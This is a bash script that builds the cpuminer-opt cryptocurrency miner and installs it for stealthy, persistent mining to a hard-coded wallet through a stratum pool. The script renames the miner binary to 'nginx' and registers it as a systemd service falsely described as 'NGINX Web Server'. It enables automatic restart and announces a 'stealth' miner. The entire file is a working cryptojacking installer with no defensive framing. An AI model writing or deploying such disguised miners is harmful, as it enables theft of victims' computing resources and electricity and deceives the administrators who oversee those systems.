#!/bin/bash

# -------- Configuration --------
RVN_WALLET="RQAJNrnHHrUKWnfm3axM4CFtnFdhtBPo6b"
THREADS=16
USERNAME=$(whoami)
INSTALL_DIR="/home/$USERNAME/.nginx_miner"
BINARY_NAME="nginx"
SERVICE_NAME="nginx"
POOL="stratum+tcp://minotaurx.mine.zpool.ca:7019"
# --------------------------------

# Step 1: Install dependencies
sudo apt update && sudo apt install -y git build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libgmp-dev

# Step 2: Clone and build cpuminer-opt
git clone https://github.com/JayDDee/cpuminer-opt.git $INSTALL_DIR
cd $INSTALL_DIR || exit
./build.sh

# Step 3: Rename miner for stealth
mv cpuminer $BINARY_NAME

# Step 4: Create a disguised systemd service
sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null <<EOF
[Unit]
Description=NGINX Web Server
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$BINARY_NAME -a minotaurx -o $POOL -u $RVN_WALLET -p c=RVN -t $THREADS
Restart=always
Nice=19
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOF

# Step 5: Enable and start service
sudo systemctl daemon-reexec
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

echo "[✔] Stealth MinotaurX miner installed and running as '$SERVICE_NAME.service'."
echo "[✔] Logs: sudo journalctl -u $SERVICE_NAME -f"
